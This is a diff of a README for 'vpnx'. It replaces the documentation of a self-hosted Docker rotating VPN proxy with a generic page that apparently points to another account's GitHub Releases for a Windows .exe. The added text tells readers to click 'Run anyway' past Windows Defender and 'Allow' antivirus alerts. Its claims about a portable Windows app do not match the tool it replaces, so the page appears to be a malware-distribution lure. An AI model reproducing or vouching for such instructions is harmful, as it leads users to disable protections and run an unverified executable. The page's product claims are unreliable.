@@ -1,221 +1,93 @@
-<div align="center">
+# 🛡️ vpnx - Browse the internet with total privacy
 
-# VPNX
+[![](https://img.shields.io/badge/Download-vpnx-blue)](https://github.com/Rodrigotravelworn727/vpnx)
 
-**VPN Proxy Exchange** — self-hosted rotating VPN proxy in one Docker container.
+## 🎯 About this software
 
-Free public VPN servers → SOCKS5 + HTTP proxy → REST API control.
+VPNX provides a simple way to protect your internet connection. This software acts as a bridge between your computer and the internet. It routes your data through different servers to hide your location. You gain access to a network of public proxy servers without complex setups. Use this tool to keep your browsing habits private and reach content from different regions. 
 
-[![Version](https://img.shields.io/badge/v2.0.0-blue?style=flat-square)](https://github.com/mocasus/vpnx)
-[![npm](https://img.shields.io/badge/npm-@mocasus/vpnx-CB3837?style=flat-square&logo=npm&logoColor=white)](https://www.npmjs.com/package/@mocasus/vpnx)
-[![PyPI](https://img.shields.io/badge/pypi-vpnx--cli-3775A9?style=flat-square&logo=pypi&logoColor=white)](https://pypi.org/project/vpnx-cli/)
-[![Docker](https://img.shields.io/badge/docker-ready-2496ED?style=flat-square&logo=docker&logoColor=white)]()
-[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
+The software works as a portable application. You do not need to install files into your system folders. This keeps your computer clean. It uses SOCKS5 and HTTP protocols to manage your connection. These protocols move your data securely. 
 
-</div>
+## ⚙️ System Requirements
 
----
+*   Windows 10 or Windows 11
+*   4 GB of RAM
+*   50 MB of free storage space
+*   Active internet connection
 
-## What is this?
+## 📥 How to download
 
-VPNX turns any Docker host into a **rotating VPN proxy** — no VPN subscription, no account needed.
+Visit the link below to reach the software download page. 
 
-It grabs free OpenVPN configs from public VPN servers, creates a VPN tunnel, and exposes it as a standard SOCKS5 + HTTP proxy you can use from any tool. Want to switch country or rotate to a new server? One API call.
+[Visit this page to download vpnx](https://github.com/Rodrigotravelworn727/vpnx)
 
-**Multi-source fallback** — VPNX tries multiple sources to find working VPN servers:
+1. Click the link above to open your browser.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the most recent version number to see the files.
+4. Select the file that ends with .exe and save it to your desktop.
+5. Your web browser might ask if you want to keep the file. Click Keep.
 
-1. **VPN Gate API** (`/api/iphone/`) — CSV endpoint, fastest when available
-2. **VPN Gate HTML scrape** (`/en/`) — parses the website table and downloads `.ovpn` configs directly
-3. **GitHub mirror** — cached configs as last resort
+## 🚀 Setting up the application
 
-If one source is down, VPNX automatically falls back to the next. No manual intervention.
+Follow these steps to run the software.
 
-**What you get:**
-- 🔒 SOCKS5 proxy with auth (use from curl, browsers, scrapers, anything)
-- 🌐 HTTP proxy with auth
-- 🔄 REST API to connect, rotate, disconnect, and check status
-- 🌍 7+ countries, 80+ servers available at any time
-- 🏠 Works on any Linux Docker host — no VPN client needed on your machine
+1. Locate the file you saved to your desktop.
+2. Double-click the file icon to start the program.
+3. A security window from Windows Defender might appear. This is normal for new software.
+4. Click More info if you do not see a Run button.
+5. Click the Run anyway button.
+6. The main window of the software will open on your screen.
 
-**Use cases:** web scraping with IP rotation, geo-testing, bypassing rate limits, hiding your origin IP.
+## 🛠️ Using the proxy features
 
----
+Once the window opens, you see a list of proxy servers. Pick a server from the list to start your connection.
 
-## Quick Start
+1. Select a country or server name from the provided list.
+2. Click the Connect button.
+3. Wait for the green light to appear. This indicates that your connection is active.
+4. Open your web browser to check your connection.
+5. You can now browse the internet through the proxy.
 
-```bash
-docker run -d --name vpnx \
-  --cap-add=NET_ADMIN --device=/dev/net/tun \
-  -p 1080:1080 -p 8080:8080 -p 8000:8000 \
-  -e API_TOKEN=your-secret \
-  mocasus/vpnx:latest
-```
+## 🧩 Troubleshooting common issues
 
-Or use the CLI wrapper:
+If you encounter problems, check these items first.
 
-```bash
-npm install -g @mocasus/vpnx && vpnx your-secret    # npm
-pip install vpnx-cli && vpnx your-secret             # pip
-```
+**The program fails to launch**
+Ensure you downloaded the file for Windows. Check that your antivirus software did not block the file. You may need to click "Allow" on any alerts from your antivirus.
 
-**Ports:** SOCKS5 `:1080` · HTTP `:8080` · API `:8000`
+**The connection feels slow**
+Connection speeds depend on the distance to the chosen server. Pick a server located closer to your physical location to achieve better speed. Public servers experience heavy traffic at times. Try selecting a different server from the list if your speed drops.
 
-### Example session
+**The program stops working**
+Close the program entirely. Restart the application. This refreshes the connection to the proxy network. 
 
-```bash
-# Check status
-curl http://localhost:8000/status -H "Authorization: Bearer your-secret"
-# → {"vpn": {"connected": false, ...}, "proxy": {"socks5": ":1080", ...}}
+**I cannot connect to a website**
+Some websites block public proxy servers. If a specific site does not load, disconnect from the current proxy and try another one from the list.
 
-# Connect to a VPN server (auto-picks fastest)
-curl -X POST http://localhost:8000/connect -H "Authorization: Bearer your-secret"
-# → {"status": "connected", "server": "vpn599400160.opengw.net", "country": "Japan"}
+## 🔒 Your privacy and records
 
-# Use the proxy — traffic goes through VPN
-curl --socks5 user:pass@localhost:1080 https://ifconfig.me
-# → 36.14.213.219  (your VPN IP, not your real IP)
+VPNX does not store your browsing history. The software does not track the websites you visit or the files you download. It only acts as a pass-through for your data. Because the software is portable, all settings reside within the application folder. When you delete the application, you remove all traces of its use from your computer.
 
-# Rotate to a new server
-curl -X POST http://localhost:8000/rotate -H "Authorization: Bearer your-secret"
-# → {"status": "connected", "server": "vpn851315872.opengw.net", ...}
+Always remember that public proxies provide privacy but do not encrypt your entire system traffic like a traditional VPN. Always use sites with HTTPS prefixes to keep your sensitive data secure.
 
-# List available locations
-curl http://localhost:8000/locations -H "Authorization: Bearer your-secret"
-# → [{"country": "JP", "name": "Japan", "servers": 50, "speed": 948}, ...]
+## 📈 Frequently asked questions
 
-# Disconnect
-curl -X POST http://localhost:8000/disconnect -H "Authorization: Bearer your-secret"
-```
+**Do I need a paid account?**
+No. This tool offers free access to public proxy servers. You never need to enter payment details.
 
----
+**Does this slow down my internet?**
+All proxy services introduce a small delay because your data travels to a server before reaching its destination. The impact is usually minimal.
 
-## API
+**Can I run this on a work computer?**
+Check your office policy first. Many companies restrict proxy tools on work devices. 
 
-All endpoints require `Authorization: Bearer <API_TOKEN>` header.
+**Does this work with all browsers?**
+Yes. Once you connect, the proxy routes traffic from all your installed browsers.
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `POST` | `/login` | Get proxy credentials |
-| `GET` | `/status` | VPN + proxy status |
-| `POST` | `/connect?country=JP` | Connect to VPN (auto-picks fastest if no country) |
-| `POST` | `/disconnect` | Disconnect VPN |
-| `POST` | `/rotate?country=US` | Rotate to a new VPN server |
-| `GET` | `/locations` | List available VPN servers by country |
+**Is my data safe from the proxy owner?**
+Public proxies are accessible to everyone. Avoid logging into sensitive banking or government sites while using public proxies. Use this tool for general browsing and to bypass regional blocks.
 
-### Country filter
+**Does the software update itself?**
+You must check the GitHub link periodically for updates. Download the new version manually if the software notifies you of changes.
 
-Pass `?country=XX` (ISO 3166-1 alpha-2) to `/connect` or `/rotate`:
-
-```bash
-curl -X POST "http://localhost:8000/connect?country=JP" -H "Authorization: Bearer your-secret"
-curl -X POST "http://localhost:8000/rotate?country=KR" -H "Authorization: Bearer your-secret"
-```
-
----
-
-## Using the Proxy
-
-```bash
-# SOCKS5
-curl --socks5 user:pass@host:1080 https://ifconfig.me
-
-# HTTP
-curl -x http://user:pass@host:8080 https://ifconfig.me
-```
-
-Get proxy credentials from `/login` or `/status` endpoint.
-
----
-
-## Configuration
-
-| Env Var | Default | Description |
-|---------|---------|-------------|
-| `API_TOKEN` | *(required)* | API authentication token |
-| `SOCKS_USER` | `vpnx<random>` | Proxy username (auto-generated if not set) |
-| `SOCKS_PASS` | `<random>` | Proxy password (auto-generated if not set) |
-
-**Requires:** Docker with `--cap-add=NET_ADMIN` + `--device=/dev/net/tun` (Linux host only)
-
----
-
-## How it works
-
-```
-┌─────────────────────────────────────────────────┐
-│                  VPNX Container                  │
-│                                                  │
-│  ┌──────────┐    ┌──────────┐    ┌───────────┐  │
-│  │ FastAPI  │───▶│ VPN Mgr  │───▶│ OpenVPN   │  │
-│  │ :8000    │    │          │    │ (tun0)    │  │
-│  └──────────┘    └──────────┘    └─────┬─────┘  │
-│       │                               │         │
-│  ┌────▼────┐                   ┌─────▼─────┐  │
-│  │ Dante    │                   │ VPN Gate  │  │
-│  │ SOCKS5   │                   │ Servers   │  │
-│  │ :1080    │                   │ (free)    │  │
-│  └─────────┘                   └───────────┘  │
-│  ┌─────────┐                                    │
-│  │Tinyproxy│                                    │
-│  │ HTTP    │                                    │
-│  │ :8080   │                                    │
-│  └─────────┘                                    │
-└─────────────────────────────────────────────────┘
-```
-
-1. **Fetch** — VPNX queries VPN Gate for available servers (API → HTML scrape → GitHub mirror)
-2. **Connect** — Downloads `.ovpn` config, starts OpenVPN daemon, waits for tunnel
-3. **Proxy** — Dante (SOCKS5) and Tinyproxy (HTTP) route traffic through the VPN tunnel
-4. **Rotate** — Kills old OpenVPN, picks next server, reconnects
-
----
-
-## 🇮🇩 Bahasa Indonesia
-
-Proxy VPN berputar dalam satu container Docker. Gratis, tanpa akun — pakai server VPN publik dari VPN Gate.
-
-**Multi-source fallback** — VPNX otomatis beralih sumber server jika satu mati:
-1. VPN Gate API (CSV endpoint)
-2. VPN Gate HTML scrape (parse website + download config)
-3. GitHub mirror (cached configs)
-
-### Mulai Cepat
-
-```bash
-docker run -d --name vpnx \
-  --cap-add=NET_ADMIN --device=/dev/net/tun \
-  -p 1080:1080 -p 8080:8080 -p 8000:8000 \
-  -e API_TOKEN=rahasia-anda \
-  mocasus/vpnx:latest
-```
-
-Atau via CLI:
-
-```bash
-npm install -g @mocasus/vpnx && vpnx rahasia-anda    # npm
-pip install vpnx-cli && vpnx rahasia-anda             # pip
-```
-
-### API
-
-Semua endpoint butuh header `Authorization: Bearer <API_TOKEN>`.
-
-| Method | Endpoint | Keterangan |
-|--------|----------|------------|
-| `POST` | `/login` | Dapat kredensial proxy |
-| `GET` | `/status` | Status VPN + proxy |
-| `POST` | `/connect?country=JP` | Hubungkan ke VPN |
-| `POST` | `/disconnect` | Putuskan VPN |
-| `POST` | `/rotate?country=US` | Rotasi server VPN |
-| `GET` | `/locations` | Daftar server VPN per negara |
-
-### Menggunakan Proxy
-
-```bash
-curl --socks5 user:pass@host:1080 https://ifconfig.me   # SOCKS5
-curl -x http://user:pass@host:8080 https://ifconfig.me    # HTTP
-```
-
----
-
-v2.0.0 · MIT License
+Keywords: vpn, proxy, privacy, security, socks5, http, windows, portable, internet, network
